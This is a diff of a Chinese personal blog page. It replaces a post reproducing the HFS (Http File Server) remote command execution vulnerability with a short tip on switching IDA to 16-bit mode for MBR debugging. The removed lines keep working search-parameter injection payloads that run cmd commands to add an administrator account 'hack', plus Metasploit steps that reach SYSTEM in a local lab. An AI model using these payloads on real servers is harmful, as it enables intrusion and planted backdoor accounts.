@@ -20,32 +20,23 @@
     var CONFIG = {"hostname":"xlcm.gitee.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="漏洞程序下载地址:Http File Server 这里说一下，在Windows server 2003中复现时，我直接使用Administrator用户登录，然后复现，未出现权限问题。再Windows 10中尝试复现时发现权限不足，需要以管理员权限执行漏洞程序。 运行程序截图如下">
+  <meta name="description" content="IDA调试MBR切换到16位模式（IDA 16-bit mode）按下ALT+S改为16-bit即可">
 <meta property="og:type" content="article">
-<meta property="og:title" content="HFS远程命令执行漏洞复现">
-<meta property="og:url" content="https://xlcm.gitee.io/2020/05/25/HFS%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:title" content="IDA调试MBR切换16位模式(IDA 16-bit mode)">
+<meta property="og:url" content="https://xlcm.gitee.io/2020/05/28/IDA%E8%B0%83%E8%AF%95MBR%E5%88%87%E6%8D%A216%E4%BD%8D%E6%A8%A1%E5%BC%8F%EF%BC%88IDA%2016-bit%20mode%EF%BC%89/index.html">
 <meta property="og:site_name" content="夏了茶糜">
-<meta property="og:description" content="漏洞程序下载地址:Http File Server 这里说一下，在Windows server 2003中复现时，我直接使用Administrator用户登录，然后复现，未出现权限问题。再Windows 10中尝试复现时发现权限不足，需要以管理员权限执行漏洞程序。 运行程序截图如下">
+<meta property="og:description" content="IDA调试MBR切换到16位模式（IDA 16-bit mode）按下ALT+S改为16-bit即可">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200528140551471.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpbjk4MDA=,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200528140655381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpbjk4MDA=,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200528141030254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpbjk4MDA=,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200528141228528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpbjk4MDA=,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200528141555846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpbjk4MDA=,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200528142017299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpbjk4MDA=,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200528142538321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpbjk4MDA=,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200528142730614.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2020052814283515.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200528142940259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpbjk4MDA=,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200528143142561.png">
-<meta property="article:published_time" content="2020-05-24T16:00:00.000Z">
-<meta property="article:modified_time" content="2020-05-28T06:46:58.268Z">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200528185910697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpbjk4MDA=,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2020-05-27T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-05-29T09:18:45.371Z">
 <meta property="article:author" content="夏了茶糜">
-<meta property="article:tag" content="WEB">
+<meta property="article:tag" content="环境">
+<meta property="article:tag" content="疑难杂症">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200528140551471.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpbjk4MDA=,size_16,color_FFFFFF,t_70">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200528185910697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpbjk4MDA=,size_16,color_FFFFFF,t_70">
 
-<link rel="canonical" href="https://xlcm.gitee.io/2020/05/25/HFS%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+<link rel="canonical" href="https://xlcm.gitee.io/2020/05/28/IDA%E8%B0%83%E8%AF%95MBR%E5%88%87%E6%8D%A216%E4%BD%8D%E6%A8%A1%E5%BC%8F%EF%BC%88IDA%2016-bit%20mode%EF%BC%89/">
 
 
 <script id="page-configurations">
@@ -58,7 +49,7 @@
   };
 </script>
 
-  <title>HFS远程命令执行漏洞复现 | 夏了茶糜</title>
+  <title>IDA调试MBR切换16位模式(IDA 16-bit mode) | 夏了茶糜</title>
   
 
 
@@ -211,7 +202,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://xlcm.gitee.io/2020/05/25/HFS%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+    <link itemprop="mainEntityOfPage" href="https://xlcm.gitee.io/2020/05/28/IDA%E8%B0%83%E8%AF%95MBR%E5%88%87%E6%8D%A216%E4%BD%8D%E6%A8%A1%E5%BC%8F%EF%BC%88IDA%2016-bit%20mode%EF%BC%89/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/54785d2ecb0034f8c30155850aab53bc.jpeg">
@@ -227,7 +218,7 @@
       
 
         <h1 class="post-title" itemprop="name headline">
-          HFS远程命令执行漏洞复现
+          IDA调试MBR切换16位模式(IDA 16-bit mode)
         </h1>
 
         <div class="post-meta">
@@ -237,14 +228,14 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2020-05-25 00:00:00" itemprop="dateCreated datePublished" datetime="2020-05-25T00:00:00+08:00">2020-05-25</time>
+              <time title="创建时间：2020-05-28 00:00:00" itemprop="dateCreated datePublished" datetime="2020-05-28T00:00:00+08:00">2020-05-28</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-28 14:46:58" itemprop="dateModified" datetime="2020-05-28T14:46:58+08:00">2020-05-28</time>
+                <time title="修改时间：2020-05-29 17:18:45" itemprop="dateModified" datetime="2020-05-29T17:18:45+08:00">2020-05-29</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -252,7 +243,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                  <a href="/categories/%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/" itemprop="url" rel="index"><span itemprop="name">疑难杂症</span></a>
                 </span>
             </span>
 
@@ -274,22 +265,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>漏洞程序下载地址:<a href="https://lanzous.com/id2vsih" target="_blank" rel="noopener">Http File Server</a></p>
-<p><strong>这里说一下，在Windows server 2003中复现时，我直接使用Administrator用户登录，然后复现，未出现权限问题。再Windows 10中尝试复现时发现权限不足，需要以管理员权限执行漏洞程序。</strong></p>
-<p>运行程序截图如下<br><img src="https://img-blog.csdnimg.cn/20200528140551471.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpbjk4MDA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<a id="more"></a>
-<p>尝试访问该软件提供的web服务<br><img src="https://img-blog.csdnimg.cn/20200528140655381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpbjk4MDA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>web服务是这个样子的，这个web服务的搜索处存在漏洞</p>
-<h2 id="一、手工利用"><a href="#一、手工利用" class="headerlink" title="一、手工利用"></a>一、手工利用</h2><p>payload如下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?search==%00&#123;.<span class="built_in">exec</span>|cmd /c 此处替换为dos命令.&#125; </span><br><span class="line">http://127.0.0.1/?search==%00&#123;.<span class="built_in">exec</span>|cmd /c 此处替换为dos命令.&#125;</span><br><span class="line">12</span><br></pre></td></tr></table></figure>
-
-<p>完整利用过程如下<br>使用如下payload添加一个管理员账户</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?search==%00&#123;.<span class="built_in">exec</span>|cmd /c net user hack 123 /add.&#125; </span><br><span class="line">1</span><br></pre></td></tr></table></figure>
-
-<p>添加用户：hack<br>密码：123<br><img src="https://img-blog.csdnimg.cn/20200528141030254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpbjk4MDA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将用户hack添加到Administrators组。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?search==%00&#123;.<span class="built_in">exec</span>|cmd /c net localgroup Administrators hack /add.&#125;</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20200528141228528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpbjk4MDA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>开启3389远程端口<br><img src="https://img-blog.csdnimg.cn/20200528141555846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpbjk4MDA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用远程连接工具连接，连接成功。<br><img src="https://img-blog.csdnimg.cn/20200528142017299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpbjk4MDA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="2、使用msf利用"><a href="#2、使用msf利用" class="headerlink" title="2、使用msf利用"></a>2、使用msf利用</h2><p>启动Metasploit，搜索hfs漏洞利用模块<br><img src="https://img-blog.csdnimg.cn/20200528142538321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpbjk4MDA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>加载模块，并设置目标IP<br><img src="https://img-blog.csdnimg.cn/20200528142730614.png" alt="在这里插入图片描述"><br>设置payload，以及本机IP<br><img src="https://img-blog.csdnimg.cn/2020052814283515.png" alt="在这里插入图片描述"><br>开始执行<br><img src="https://img-blog.csdnimg.cn/20200528142940259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpbjk4MDA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功获得system权限<br><img src="https://img-blog.csdnimg.cn/20200528143142561.png" alt="在这里插入图片描述"></p>
+        <p>IDA调试MBR切换到16位模式（IDA 16-bit mode）<br>按下ALT+S<br><img src="https://img-blog.csdnimg.cn/20200528185910697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpbjk4MDA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>改为16-bit即可</p>
 
     </div>
 
@@ -306,12 +282,12 @@
   <!-- JS库 sweetalert 可修改路径 -->
   <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-  <p><span>本文标题:</span><a href="/2020/05/25/HFS%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">HFS远程命令执行漏洞复现</a></p>
+  <p><span>本文标题:</span><a href="/2020/05/28/IDA%E8%B0%83%E8%AF%95MBR%E5%88%87%E6%8D%A216%E4%BD%8D%E6%A8%A1%E5%BC%8F%EF%BC%88IDA%2016-bit%20mode%EF%BC%89/">IDA调试MBR切换16位模式(IDA 16-bit mode)</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 夏了茶糜 的个人博客">夏了茶糜</a></p>
-  <p><span>发布时间:</span>2020年05月25日 - 00:05</p>
-  <p><span>最后更新:</span>2020年05月28日 - 14:05</p>
-  <p><span>原始链接:</span><a href="/2020/05/25/HFS%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="HFS远程命令执行漏洞复现">https://xlcm.gitee.io/2020/05/25/HFS%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a>
-    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://xlcm.gitee.io/2020/05/25/HFS%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"  aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2020年05月28日 - 00:05</p>
+  <p><span>最后更新:</span>2020年05月29日 - 17:05</p>
+  <p><span>原始链接:</span><a href="/2020/05/28/IDA%E8%B0%83%E8%AF%95MBR%E5%88%87%E6%8D%A216%E4%BD%8D%E6%A8%A1%E5%BC%8F%EF%BC%88IDA%2016-bit%20mode%EF%BC%89/" title="IDA调试MBR切换16位模式(IDA 16-bit mode)">https://xlcm.gitee.io/2020/05/28/IDA%E8%B0%83%E8%AF%95MBR%E5%88%87%E6%8D%A216%E4%BD%8D%E6%A8%A1%E5%BC%8F%EF%BC%88IDA%2016-bit%20mode%EF%BC%89/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://xlcm.gitee.io/2020/05/28/IDA%E8%B0%83%E8%AF%95MBR%E5%88%87%E6%8D%A216%E4%BD%8D%E6%A8%A1%E5%BC%8F%EF%BC%88IDA%2016-bit%20mode%EF%BC%89/"  aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> 转载请保留原文链接及作者。</p>  
 </div>
@@ -356,7 +332,8 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/WEB/" rel="tag"># WEB</a>
+              <a href="/tags/%E7%8E%AF%E5%A2%83/" rel="tag"># 环境</a>
+              <a href="/tags/%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/" rel="tag"># 疑难杂症</a>
           </div>
 
         
@@ -365,10 +342,13 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2020/05/25/2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%80%86%E5%90%91%E7%AD%BE%E5%88%B0%E9%A2%98beijing/" rel="prev" title="2018网鼎杯逆向签到题beijing">
-      <i class="fa fa-chevron-left"></i> 2018网鼎杯逆向签到题beijing
+    <a href="/2020/05/27/HFS%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="prev" title="HFS远程命令执行漏洞复现">
+      <i class="fa fa-chevron-left"></i> HFS远程命令执行漏洞复现
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2020/05/29/Windbg%20!peb%EF%BC%9Aerror%203%20InitTypeRead/" rel="next" title="Windbg !peb：error 3 InitTypeRead解决方案">
+      Windbg !peb：error 3 InitTypeRead解决方案 <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -427,7 +407,6 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、手工利用"><span class="nav-number">1.</span> <span class="nav-text">一、手工利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2、使用msf利用"><span class="nav-number">2.</span> <span class="nav-text">2、使用msf利用</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -443,7 +422,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives">
         
-          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-count">7</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
